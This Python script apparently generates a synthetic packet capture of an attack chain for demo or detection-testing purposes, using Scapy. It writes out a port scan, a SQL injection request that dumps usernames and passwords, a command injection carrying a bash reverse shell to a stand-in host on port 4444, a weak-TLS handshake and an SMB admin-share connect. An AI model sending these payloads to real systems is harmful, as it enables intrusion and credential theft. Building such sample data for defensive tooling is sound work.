from __future__ import annotations

from datetime import datetime
from pathlib import Path


PROJECT_ROOT = Path(__file__).resolve().parent.parent
DEFAULT_OUTPUT = PROJECT_ROOT / "sample_data" / "demo_attack_chain.pcap"


def generate_demo_pcap(output_path: str | Path = DEFAULT_OUTPUT) -> Path:
    try:
        from scapy.all import IP, TCP, Raw, wrpcap
    except ImportError as exc:
        raise RuntimeError("Scapy is required to generate the demo pcap. Install requirements.txt first.") from exc

    output = Path(output_path)
    output.parent.mkdir(parents=True, exist_ok=True)

    src_ip = "10.0.0.10"
    target_ip = "10.0.1.50"
    base_time = datetime(2026, 1, 1, 12, 0, 0).timestamp()
    packets = []

    def add(packet: object, offset: float) -> None:
        packet.time = base_time + offset  # type: ignore[attr-defined]
        packets.append(packet)

    for index in range(30):
        dst_ip = f"10.0.1.{20 + index}"
        add(IP(src=src_ip, dst=dst_ip) / TCP(sport=41000 + index, dport=80, flags="S"), index * 0.2)

    add(IP(src=src_ip, dst=target_ip) / TCP(sport=41031, dport=80, flags="S"), 6.2)

    sql_payload = (
        "GET /search?q=' OR 1=1 UNION SELECT username,password FROM users-- HTTP/1.1\r\n"
        "Host: demo.internal\r\n\r\n"
    )
    add(IP(src=src_ip, dst=target_ip) / TCP(sport=42000, dport=80, flags="PA") / Raw(load=sql_payload), 11.5)

    command_payload = (
        "POST /admin/run HTTP/1.1\r\n"
        "Host: demo.internal\r\n"
        "Content-Length: 70\r\n\r\n"
        "cmd=whoami; bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"
    )
    add(IP(src=src_ip, dst=target_ip) / TCP(sport=42001, dport=80, flags="PA") / Raw(load=command_payload), 13.5)

    tls_payload = (
        b"\x16\x03\x01\x00\x8fclient hello; version=tlsv1.0; cipher=RC4-MD5; "
        b"self_signed=true; sni=demo.internal"
    )
    add(IP(src=src_ip, dst=target_ip) / TCP(sport=42002, dport=443, flags="PA") / Raw(load=tls_payload), 15.5)

    admin_share_payload = r"SMB Tree Connect Request Path: \\10.0.1.50\ADMIN$"
    add(IP(src=src_ip, dst=target_ip) / TCP(sport=42003, dport=445, flags="PA") / Raw(load=admin_share_payload), 17.5)

    wrpcap(str(output), packets)
    return output


if __name__ == "__main__":
    path = generate_demo_pcap()
    print(path)
